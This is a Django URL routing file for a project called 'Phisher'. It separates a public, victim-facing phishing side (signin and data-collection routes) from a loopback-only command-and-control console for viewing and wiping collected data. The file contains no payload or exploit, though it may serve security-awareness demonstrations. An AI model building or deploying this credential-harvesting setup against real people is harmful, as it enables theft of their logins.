import os

from django.urls import path

from Phisher import views, collector_views

# Which half of the system this container is.
#
#   phish - the page victims see. Public. Serves the landing page and the
#           beacon, and nothing else: /gate and /collector are not routes
#           here at all, so no password guesser can even reach them.
#   c2    - the operator console. Bound to loopback, never published.
#   both  - everything on one port. Convenient locally, wrong in public.
#
# Keeping them apart means the address you hand to a room and the address
# that holds their data are not the same service.
ROLE = os.environ.get('ROLE', 'both').lower()

PHISH = [
    path('', views.index, name='home'),
    path('signin', views.signin, name='signin'),
    path('collect', collector_views.collect, name='collect'),
    path('error', views.error, name='error'),
]

C2 = [
    path('gate', collector_views.gate, name='gate'),
    path('collector', collector_views.collector, name='collector'),
    path('collector/wipe', collector_views.wipe, name='wipe'),
    path('collector/password', collector_views.change_password, name='change-password'),
    path('get-hits', views.get_hit_counts, name='get-hit-counts'),
]

if ROLE == 'phish':
    urlpatterns = PHISH
elif ROLE == 'c2':
    urlpatterns = C2
else:
    urlpatterns = PHISH + C2
